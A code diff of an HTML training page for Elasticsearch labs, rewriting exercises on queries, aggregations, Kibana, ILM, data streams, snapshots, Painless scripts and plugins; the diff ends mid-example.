@@ -322,7 +322,7 @@
   <div class="container">
     <div id="ms" class="module-select">
       <h1>🔬 Elasticsearch Training Labs</h1>
-      <p class="subtitle">5 hands-on labs per module — commands, JSON output &amp; diagrams</p>
+      <p class="subtitle">Multiple hands-on labs per module — commands, JSON output &amp; diagrams</p>
       <button onclick="go('m1')"><span class="n">1</span>Introduction &amp; Cluster Basics</button>
       <button onclick="go('m2')"><span class="n">2</span>Install, Security &amp; Monitoring</button>
       <button onclick="go('m3')"><span class="n">3</span>Data Ingestion &amp; Mapping</button>
@@ -650,19 +650,38 @@ POST employees/_doc/1
       ],
 
       m4: [
-        ["Search, Scoring & Analysis: Find employees named 'John', test Analyzers, and use Boosting.",
-          `<p><strong>Step 1:</strong> Match query (Scoring context)</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET employees/_search
+        ["Lab 10: Query vs. Filter Contexts",
+          `<p><strong>Step 1:</strong> Insert sample products.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /products/_bulk
+{"index":{"_id":"1"}}
+{"name": "Running Shoe", "category": "Footwear", "price": 90}
+{"index":{"_id":"2"}}
+{"name": "Walking Shoe", "category": "Footwear", "price": 120}
+{"index":{"_id":"3"}}
+{"name": "Winter Jacket", "category": "Apparel", "price": 150}</div></div>
+<p><strong>Step 2:</strong> Mixed context (must + filter).</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET products/_search
 {
-  "query": { "match": { "name": "John" } }
+  "query": {
+    "bool": {
+      "must":   { "match": { "name": "shoe" } },
+      "filter": { "range": { "price": { "lt": 100 } } }
+    }
+  }
 }</div></div>
-<p><strong>Step 2:</strong> Test Standard Analyzer</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST _analyze
+<p><strong>Step 3:</strong> Pure filter (no scoring).</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET products/_search
 {
-  "analyzer": "standard",
-  "text": "Elasticsearch is FAST!"
+  "query": {
+    "bool": {
+      "filter": [
+        { "match": { "name": "shoe" } },
+        { "range": { "price": { "lt": 100 } } }
+      ]
+    }
+  }
 }</div></div>
-<p><strong>Step 3:</strong> Field Boosting (^3 weight)</p>
+<p><strong>Step 4:</strong> Field Boosting (^3 weight).</p>
 <div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET products/_search
 {
   "query": {
@@ -672,511 +691,290 @@ POST employees/_doc/1
     }
   }
 }</div></div>
-<p><strong>Why?</strong> The Standard analyzer shows how text is tokenized (lower-cased, punctuation removed). Boosting allows you to give title matches more weight than body-text matches.</p>`, "beginner"],
+<p><strong>Why?</strong> The filter context skips relevance scoring, making it much faster and allowing results to be cached. Boosting allows you to prioritize matches in specific fields (like titles) over others.</p>`, "beginner"],
 
-        ["Write a bool query with range + filter.",
-          `<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET employees/_search
+        ["Lab 11: Aggregations Framework",
+          `<p><strong>Step 1:</strong> Average price per category.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET products/_search
 {
-  <span class="k">"query"</span>: {
-    <span class="k">"bool"</span>: {
-      <span class="k">"must"</span>: {
-        <span class="k">"range"</span>: { <span class="k">"age"</span>: { <span class="k">"gte"</span>: <span class="n">25</span>, <span class="k">"lte"</span>: <span class="n">40</span> } }
-      },
-      <span class="k">"filter"</span>: {
-        <span class="k">"term"</span>: { <span class="k">"department"</span>: <span class="s">"Engineering"</span> }
+  "size": 0,
+  "aggs": {
+    "by_category": {
+      "terms": { "field": "category.keyword" },
+      "aggs": {
+        "avg_price":   { "avg":   { "field": "price" } },
+        "price_stats": { "stats": { "field": "price" } }
       }
     }
   }
 }</div></div>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="d">Bool Query Clauses:
+<p><strong>Why?</strong> Aggregations provide analytical insights from your data. Using <code>size: 0</code> skips the document hit list and only returns the summary results, preserving performance.</p>`, "intermediate"],
 
-  must      →  scored match       (like AND)
-  should    →  scored boost       (like OR)
-  filter    →  unscored match     (fast, cached)
-  must_not  →  exclude documents  (no score)</div></div>
-<p><strong>Why?</strong> Using <code>filter</code> instead of <code>must</code> tells Elasticsearch to skip scoring. This is faster and allows the results to be cached.</p>`, "intermediate"],
+        ["Lab 12: Building Kibana Dashboards",
+          `<p><strong>Step 1:</strong> Create a Data View for <code>products</code> in <strong>Stack Management</strong>.</p>
+<p><strong>Step 2:</strong> Create visualizations (Pie, Bar, Table) in <strong>Dashboards</strong>.</p>
+<p><strong>Step 3:</strong> Use <strong>Discover</strong> to query with KQL:</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">category : "Footwear" and price > 100</div></div>
+<p><strong>Why?</strong> Dashboards transform raw JSON data into visual insights for stakeholders. Data views are the necessary bridge that tells Kibana which indices to read.</p>`, "beginner"],
 
-        ["Aggregation: average price per category.",
-          `<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET products/_search
+        ["Lab 13: Analyzing Search Performance",
+          `<p><strong>Step 1:</strong> Execute query with profiling enabled.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET products/_search
 {
-  <span class="k">"size"</span>: <span class="n">0</span>,
-  <span class="k">"aggs"</span>: {
-    <span class="k">"by_category"</span>: {
-      <span class="k">"terms"</span>: { <span class="k">"field"</span>: <span class="s">"category"</span> },
-      <span class="k">"aggs"</span>: {
-        <span class="k">"avg_price"</span>:   { <span class="k">"avg"</span>:   { <span class="k">"field"</span>: <span class="s">"price"</span> } },
-        <span class="k">"price_stats"</span>: { <span class="k">"stats"</span>: { <span class="k">"field"</span>: <span class="s">"price"</span> } }
-      }
+  "profile": true,
+  "query": { "match": { "name": "shoe" } }
+}</div></div>
+<p><strong>Step 2:</strong> Compare with filter context profiling.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET products/_search
+{
+  "profile": true,
+  "query": {
+    "bool": {
+      "filter": { "term": { "category.keyword": "Footwear" } }
     }
   }
 }</div></div>
-<p><strong>Response:</strong></p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j"><span class="k">"buckets"</span>: [{
-  <span class="k">"key"</span>:       <span class="s">"Electronics"</span>,
-  <span class="k">"doc_count"</span>: <span class="n">2</span>,
-  <span class="k">"avg_price"</span>: { <span class="k">"value"</span>: <span class="n">599.99</span> }
-}]</div></div>
-<p><strong>Why?</strong> Aggregations provide insights from data. Using <code>size: 0</code> skips document hits, returning only the summary results, which is much faster.</p>`, "intermediate"],
+<p><strong>Why?</strong> The Profile API reveals exactly where Lucene spends time (scoring, matching, or building). Filter context shows 0ms for scoring, proving its performance advantage.</p>`, "advanced"],
 
-        ["Use ES|QL to find top 3 expensive products.",
-          `<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="d">ES|QL (pipe syntax):
-
-  FROM products
-  | SORT price DESC
-  | LIMIT 3
-  | KEEP name, price, category</div></div>
-<p><strong>Response:</strong></p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">{
-  <span class="k">"columns"</span>: [
-    { <span class="k">"name"</span>: <span class="s">"name"</span>,  <span class="k">"type"</span>: <span class="s">"text"</span> },
-    { <span class="k">"name"</span>: <span class="s">"price"</span>, <span class="k">"type"</span>: <span class="s">"float"</span> }
-  ],
-  <span class="k">"values"</span>: [
-    [<span class="s">"Laptop"</span>,        <span class="n">999.99</span>],
-    [<span class="s">"Headphones"</span>,    <span class="n">199.99</span>],
-    [<span class="s">"Running Shoes"</span>, <span class="n">129.99</span>]
-  ]
-}</div></div>
-<p><strong>Why?</strong> ES|QL uses a pipe-based syntax that is far easier to read and write than deeply nested Query DSL JSON.</p>`, "advanced"],
-
-        ["Use Profile API to analyze query execution.",
-          `<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET products/_search
+        ["Lab 14: ES|QL, SQL, and EQL",
+          `<p><strong>Query 1:</strong> ES|QL (Pipe-based analysis).</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">FROM products
+| STATS avg_p = AVG(price) BY category
+| SORT avg_p DESC</div></div>
+<p><strong>Query 2:</strong> SQL (Traditional relational syntax).</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST _sql?format=txt
 {
-  <span class="k">"profile"</span>: <span class="n">true</span>,
-  <span class="k">"query"</span>: { <span class="k">"match"</span>: { <span class="k">"name"</span>: <span class="s">"laptop"</span> } }
+  "query": "SELECT name, price FROM products WHERE category = 'Footwear' ORDER BY price DESC"
 }</div></div>
-<p>Profile output shows nanosecond timings:</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="d">Profile:
-  ├── BooleanQuery              12ms
-  │   ├── TermQuery "laptop"     8ms   ← 68% of total
-  │   └── TermQuery "name"       4ms   ← cached
-  ├── build_scorer                2ms
-  └── collect                    10ms</div></div>
-<p><strong>Why?</strong> The Profile API reveals nanosecond-level timing for every stage of your query, helping you diagnose slow searches.</p>`, "advanced"]
+<p><strong>Query 3:</strong> EQL (Event correlation syntax).</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET products/_eql/search
+{
+  "query": "any where category == 'Footwear' and price > 100"
+}</div></div>
+<p><strong>Why?</strong> ES|QL simplifies complex aggregations into linear pipes. SQL lowers the barrier for RDBMS users, and EQL is optimized for sequence-based threat hunting.</p>`, "advanced"]
       ],
 
       m5: [
-        ["Create an index alias pointing to employees.",
-          `<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST _aliases
+        ["Lab 15: Index Lifecycle Management (ILM)",
+          `<p><strong>Step 1:</strong> Create ILM policy (hot → warm → delete).</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _ilm/policy/logs_policy
 {
-  <span class="k">"actions"</span>: [
-    { <span class="k">"add"</span>: { <span class="k">"index"</span>: <span class="s">"employees"</span>, <span class="k">"alias"</span>: <span class="s">"staff"</span> } }
-  ]
-}</div></div>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="c0"><span class="p">$</span> curl <span class="u">"localhost:9200/staff/_search"</span>       <span class="c">// uses alias</span>
-<span class="p">$</span> curl <span class="u">"localhost:9200/employees/_search"</span>  <span class="c">// uses real name</span></div></div>
-<p><strong>Alias swap</strong> (zero-downtime reindex):</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST _aliases
-{
-  <span class="k">"actions"</span>: [
-    { <span class="k">"remove"</span>: { <span class="k">"index"</span>: <span class="s">"v1"</span>, <span class="k">"alias"</span>: <span class="s">"staff"</span> } },
-    { <span class="k">"add"</span>:    { <span class="k">"index"</span>: <span class="s">"v2"</span>, <span class="k">"alias"</span>: <span class="s">"staff"</span> } }
-  ]
-}
-<span class="c">// Atomic swap! Zero downtime.</span></div></div>
-<p><strong>Why?</strong> Aliases allow for zero-downtime reindexing. You can point your application to a new index version without changing any code.</p>`, "beginner"],
-
-        ["Create a snapshot repository and take a backup.",
-          `<p><strong>Step 1:</strong> Register repository</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _snapshot/my_backup
-{
-  <span class="k">"type"</span>:     <span class="s">"fs"</span>,
-  <span class="k">"settings"</span>: { <span class="k">"location"</span>: <span class="s">"/mount/backups/es"</span> }
-}</div></div>
-<p><strong>Step 2:</strong> Take snapshot</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _snapshot/my_backup/snapshot_2024
-{
-  <span class="k">"indices"</span>:              <span class="s">"products"</span>,
-  <span class="k">"include_global_state"</span>: <span class="n">false</span>
-}</div></div>
-<p><strong>Step 3:</strong> Restore</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST _snapshot/my_backup/snapshot_2024/_restore
-{
-  <span class="k">"indices"</span>: <span class="s">"products"</span>
-}</div></div>
-<p><strong>Why?</strong> Snapshots are point-in-time backups. They protect against human error and data corruption, allowing you to restore to a known good state.</p>`, "intermediate"],
-
-        ["Create ILM policy: hot → warm → delete.",
-          `<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _ilm/policy/logs_policy
-{
-  <span class="k">"policy"</span>: {
-    <span class="k">"phases"</span>: {
-      <span class="k">"hot"</span>: {
-        <span class="k">"actions"</span>: {
-          <span class="k">"rollover"</span>: {
-            <span class="k">"max_primary_shard_size"</span>: <span class="s">"50gb"</span>,
-            <span class="k">"max_age"</span>: <span class="s">"1d"</span>
-          }
-        }
+  "policy": {
+    "phases": {
+      "hot": {
+        "actions": { "rollover": { "max_primary_shard_size": "50gb", "max_age": "30d" } }
       },
-      <span class="k">"warm"</span>: {
-        <span class="k">"min_age"</span>: <span class="s">"7d"</span>,
-        <span class="k">"actions"</span>: {
-          <span class="k">"shrink"</span>:     { <span class="k">"number_of_shards"</span>: <span class="n">1</span> },
-          <span class="k">"forcemerge"</span>: { <span class="k">"max_num_segments"</span>: <span class="n">1</span> }
-        }
-      },
-      <span class="k">"delete"</span>: {
-        <span class="k">"min_age"</span>: <span class="s">"30d"</span>,
-        <span class="k">"actions"</span>: { <span class="k">"delete"</span>: {} }
+      "delete": {
+        "min_age": "90d",
+        "actions": { "delete": {} }
       }
     }
   }
 }</div></div>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="d">Day 0───────Day 7────────Day 30─────►
-
-│  │  Indexing │  Read-only  │  Removed   │
-│  + Search │  Shrink     │            │</div></div>
-<p><strong>Why?</strong> ILM automates the data lifecycle, ensuring that old data is moved to cheaper hardware or deleted to save costs.</p>`, "advanced"],
-
-        ["Create a Data Stream for time-series metrics.",
-          `<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _index_template/metrics_template
+<p><strong>Step 2:</strong> Attach policy to an index template.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _index_template/logs_template
 {
-  <span class="k">"index_patterns"</span>: [<span class="s">"metrics-*"</span>],
-  <span class="k">"data_stream"</span>: {},
-  <span class="k">"template"</span>: {
-    <span class="k">"mappings"</span>: {
-      <span class="k">"properties"</span>: {
-        <span class="k">"@timestamp"</span>: { <span class="k">"type"</span>: <span class="s">"date"</span> },
-        <span class="k">"cpu"</span>:        { <span class="k">"type"</span>: <span class="s">"float"</span> },
-        <span class="k">"host"</span>:       { <span class="k">"type"</span>: <span class="s">"keyword"</span> }
+  "index_patterns": ["logs-*"],
+  "template": {
+    "settings": {
+      "index.lifecycle.name": "logs_policy",
+      "index.lifecycle.rollover_alias": "logs"
+    }
+  }
+}</div></div>
+<p><strong>Step 3:</strong> Bootstrap the first index.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT logs-000001
+{
+  "aliases": { "logs": { "is_write_index": true } }
+}</div></div>
+<p><strong>Why?</strong> ILM automates the management of indices over time. It ensures that data is moved to cheaper storage or deleted automatically, reducing manual operations and costs.</p>`, "advanced"],
+
+        ["Lab 16: Working with Data Streams",
+          `<p><strong>Step 1:</strong> Create component templates for mappings and settings.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _component_template/logs-mappings
+{
+  "template": {
+    "mappings": {
+      "properties": {
+        "@timestamp": { "type": "date" },
+        "message": { "type": "text" },
+        "log.level": { "type": "keyword" }
       }
     }
   }
 }</div></div>
-<p>Index a doc (auto-creates stream):</p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST metrics-cpu/_doc
+<p><strong>Step 2:</strong> Create an index template for the data stream.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _index_template/app-logs-template
 {
-  <span class="k">"@timestamp"</span>: <span class="s">"2024-10-15T10:00:00Z"</span>,
-  <span class="k">"cpu"</span>:  <span class="n">75.5</span>,
-  <span class="k">"host"</span>: <span class="s">"server-1"</span>
+  "index_patterns": ["app-logs-*"],
+  "data_stream": {},
+  "composed_of": ["logs-mappings"],
+  "priority": 500
 }</div></div>
-<p><strong>Why?</strong> Data streams are the optimized way to handle logs and metrics, treating multiple indices as a single virtual resource.</p>`, "intermediate"],
-
-        ["Downsampling with a Transform.",
-          `<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _transform/downsample_cpu
+<p><strong>Step 3:</strong> Index a document (automatically creates the stream).</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST app-logs-training/_doc
 {
-  <span class="k">"source"</span>: { <span class="k">"index"</span>: <span class="s">"metrics-cpu"</span> },
-  <span class="k">"dest"</span>:   { <span class="k">"index"</span>: <span class="s">"metrics-cpu-hourly"</span> },
-  <span class="k">"pivot"</span>: {
-    <span class="k">"group_by"</span>: {
-      <span class="k">"hour"</span>: {
-        <span class="k">"date_histogram"</span>: {
-          <span class="k">"field"</span>: <span class="s">"@timestamp"</span>,
-          <span class="k">"fixed_interval"</span>: <span class="s">"1h"</span>
-        }
-      }
+  "@timestamp": "2024-10-15T10:00:00Z",
+  "message": "Application started",
+  "log.level": "INFO"
+}</div></div>
+<p><strong>Why?</strong> Data streams are optimized for append-only time-series data. They treat multiple backing indices as a single resource, handling rollover and retention transparently.</p>`, "intermediate"],
+
+        ["Lab 17: Configuring Local Snapshots",
+          `<p><strong>Step 1:</strong> Register the snapshot repository.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _snapshot/my_fs_backup
+{
+  "type": "fs",
+  "settings": { "location": "/var/backups/es_repo" }
+}</div></div>
+<p><strong>Step 2:</strong> Execute a manual snapshot.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _snapshot/my_fs_backup/snapshot_1?wait_for_completion=true</div></div>
+<p><strong>Step 3:</strong> Restore an index from the snapshot.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST /_snapshot/my_fs_backup/snapshot_1/_restore
+{
+  "indices": "products"
+}</div></div>
+<p><strong>Why?</strong> Snapshots are point-in-time backups essential for disaster recovery. They allow you to restore data to a known good state after accidental deletion or corruption.</p>`, "intermediate"],
+
+        ["Lab 18: Downsampling Time-Series Data",
+          `<p><strong>Step 1:</strong> Create a transform to downsample granular raw data.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">PUT _transform/downsample_metrics
+{
+  "source": { "index": "server_metrics" },
+  "dest": { "index": "server_metrics_1m" },
+  "pivot": {
+    "group_by": {
+      "hostname": { "terms": { "field": "hostname" } },
+      "timestamp": { "date_histogram": { "field": "@timestamp", "fixed_interval": "1m" } }
     },
-    <span class="k">"aggregations"</span>: {
-      <span class="k">"avg_cpu"</span>: { <span class="k">"avg"</span>: { <span class="k">"field"</span>: <span class="s">"cpu"</span> } },
-      <span class="k">"max_cpu"</span>: { <span class="k">"max"</span>: { <span class="k">"field"</span>: <span class="s">"cpu"</span> } }
+    "aggregations": {
+      "avg_cpu": { "avg": { "field": "cpu_percent" } }
     }
   }
-}
-
-POST _transform/downsample_cpu/_start</div></div>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="d">Result:
-  3,600 per-second docs  →  1 per-hour summary
-  Storage reduction: ~99.97%!</div></div>
-<p><strong>Why?</strong> Downsampling reduces storage costs by orders of magnitude for older data while preserving the ability to query trends.</p>`, "advanced"]
+}</div></div>
+<p><strong>Step 2:</strong> Start the transform.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST _transform/downsample_metrics/_start</div></div>
+<p><strong>Why?</strong> Downsampling summarizes old time-series data, preserving long-term trends while reducing storage usage by up to 90%.</p>`, "advanced"]
       ],
 
       m6: [
-        ["Update a document's age and add a new field.",
-          `<p><strong>Partial update (merge):</strong></p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST employees/_update/1
+        ["Lab 19: Using Painless Scripts",
+          `<p><strong>Step 1:</strong> Update a document field dynamically (+10 markup).</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST products/_update/1
 {
-  <span class="k">"doc"</span>: {
-    <span class="k">"age"</span>:   <span class="n">35</span>,
-    <span class="k">"title"</span>: <span class="s">"Senior Engineer"</span>
+  "script": {
+    "source": "ctx._source.price += params.markup",
+    "params": { "markup": 10 }
   }
 }</div></div>
-<p><strong>Verify:</strong></p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET employees/_doc/1
+<p><strong>Step 2:</strong> Conditional logic inside Painless.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST products/_update/1
 {
-  <span class="k">"_source"</span>: {
-    <span class="k">"name"</span>:       <span class="s">"John Smith"</span>,
-    <span class="k">"age"</span>:        <span class="n">35</span>,                    <span class="c">// updated</span>
-    <span class="k">"department"</span>: <span class="s">"Engineering"</span>,
-    <span class="k">"title"</span>:      <span class="s">"Senior Engineer"</span>       <span class="c">// added</span>
+  "script": {
+    "source": "if (ctx._source.price > params.threshold) { ctx._source.price = (int)(ctx._source.price * 0.8) }",
+    "params": { "threshold": 50 }
   }
 }</div></div>
-<p><strong>Why?</strong> Partial updates simplify application logic by only sending the fields that changed, rather than the entire document.</p>`, "beginner"],
-
-        ["Delete a document and an entire index.",
-          `<p><strong>Delete single document:</strong></p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">DELETE employees/_doc/1
-{ <span class="k">"result"</span>: <span class="s">"deleted"</span> }</div></div>
-<p><strong>Delete by query (bulk):</strong></p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST employees/_delete_by_query
+<p><strong>Step 3:</strong> Script fields at search time (virtual fields).</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET products/_search
 {
-  <span class="k">"query"</span>: { <span class="k">"range"</span>: { <span class="k">"age"</span>: { <span class="k">"lt"</span>: <span class="n">25</span> } } }
-}
-{ <span class="k">"deleted"</span>: <span class="n">3</span> }</div></div>
-<p><strong>Delete entire index:</strong></p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">DELETE employees
-{ <span class="k">"acknowledged"</span>: <span class="n">true</span> }</div></div>
-<p><strong>Why?</strong> Deleting an index is much faster and more efficient than deleting every document individually using <code>_delete_by_query</code>.</p>`, "intermediate"],
-
-        ["Painless script to increase salaries by 10%.",
-          `<p><strong>Single document:</strong></p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST employees/_update/1
-{
-  <span class="k">"script"</span>: {
-    <span class="k">"source"</span>: <span class="s">"ctx._source.salary *= params.factor"</span>,
-    <span class="k">"lang"</span>:   <span class="s">"painless"</span>,
-    <span class="k">"params"</span>: { <span class="k">"factor"</span>: <span class="n">1.10</span> }
+  "query": { "match_all": {} },
+  "script_fields": {
+    "price_with_tax": { "script": "doc['price'].value * 1.15" }
   }
 }</div></div>
-<p><strong>Bulk update all:</strong></p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST employees/_update_by_query
+<p><strong>Why?</strong> Painless scripts allow for complex server-side logic without the overhead of application-side read-modify-write cycles. Script fields allow you to compute "virtual" fields on the fly without bloating storage.</p>`, "advanced"],
+
+        ["Lab 20: REST API Deep Dive & Python Client",
+          `<p><strong>Step 1:</strong> Inspect cluster and node health.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET _cluster/health
+GET _nodes/stats/jvm,os</div></div>
+<p><strong>Step 2:</strong> Use human-readable CAT APIs.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET _cat/indices?v&h=index,docs.count,store.size&s=docs.count:desc</div></div>
+<p><strong>Step 3:</strong> Test the official Python client (Python SDK).</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="cmd-block">pip3 install elasticsearch
+# Run es_demo.py script provided in lab instructions</div></div>
+<p><strong>Why?</strong> The CAT APIs were designed for human diagnostics. Programmatic access via official clients ensures robust features like automatic retries and load balancing are handled at the library level.</p>`, "intermediate"],
+
+        ["Lab 21: Installing and Managing Plugins",
+          `<p><strong>Step 1:</strong> Install the <strong>analysis-icu</strong> plugin via CLI.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="cmd-block">sudo /usr/share/elasticsearch/bin/elasticsearch-plugin install analysis-icu
+sudo systemctl restart elasticsearch.service</div></div>
+<p><strong>Step 2:</strong> Test ICU vs Standard analyzer on CJK text.</p>
+<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">POST _analyze
 {
-  <span class="k">"script"</span>: { <span class="k">"source"</span>: <span class="s">"ctx._source.salary *= 1.10"</span> },
-  <span class="k">"query"</span>:  { <span class="k">"match_all"</span>: {} }
-}
-{ <span class="k">"updated"</span>: <span class="n">5</span> }</div></div>
-<p><strong>Why?</strong> Painless scripts allow for complex server-side logic (like conditional pricing) that would be slow or difficult to implement client-side.</p>`, "advanced"],
-
-        ["Use _cat APIs for a quick cluster overview.",
-          `<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="c0"><span class="p">$</span> curl <span class="u">"localhost:9200/_cat/nodes?v&amp;h=name,role,heap.percent,cpu"</span>
-
-name    role  heap.percent  cpu
-node-1  dim             45   12
-node-2  d               62    8</div></div>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="c0"><span class="p">$</span> curl <span class="u">"localhost:9200/_cat/indices?v&amp;s=store.size:desc"</span>
-
-index       health  docs.count  store.size
-products    yellow           4       15kb
-employees   yellow           5       12kb</div></div>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="c0"><span class="p">$</span> curl <span class="u">"localhost:9200/_cat/thread_pool?v&amp;h=node_name,name,active,queue,rejected"</span>
-
-node_name  name    active  queue  rejected
-node-1     search       0      0         0
-node-1     write        1      0         0</div></div>
-<p><strong>Why?</strong> The CAT APIs provide human-readable summaries of cluster state, perfect for a quick health check from the command line.</p>`, "intermediate"],
-
-        ["Script field to calculate discounted price.",
-          `<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">GET products/_search
-{
-  <span class="k">"query"</span>: { <span class="k">"match_all"</span>: {} },
-  <span class="k">"script_fields"</span>: {
-    <span class="k">"discounted_price"</span>: {
-      <span class="k">"script"</span>: {
-        <span class="k">"source"</span>: <span class="s">"doc['price'].value * params.discount"</span>,
-        <span class="k">"params"</span>: { <span class="k">"discount"</span>: <span class="n">0.80</span> }
-      }
-    },
-    <span class="k">"savings"</span>: {
-      <span class="k">"script"</span>: {
-        <span class="k">"source"</span>: <span class="s">"doc['price'].value * (1-params.discount)"</span>,
-        <span class="k">"params"</span>: { <span class="k">"discount"</span>: <span class="n">0.80</span> }
-      }
-    }
-  },
-  <span class="k">"_source"</span>: [<span class="s">"name"</span>, <span class="s">"price"</span>]
+  "analyzer": "icu_analyzer",
+  "text": "東京は日本の首都です"
 }</div></div>
-<p><strong>Response:</strong></p>
-<div class="copy-wrap"><button class="copy-btn-overlay" onclick="cpCode(this)">&#128203; Copy</button><div class="j">{
-  <span class="k">"_source"</span>: { <span class="k">"name"</span>: <span class="s">"Laptop"</span>, <span class="k">"price"</span>: <span class="n">999.99</span> },
-  <span class="k">"fields"</span>: {
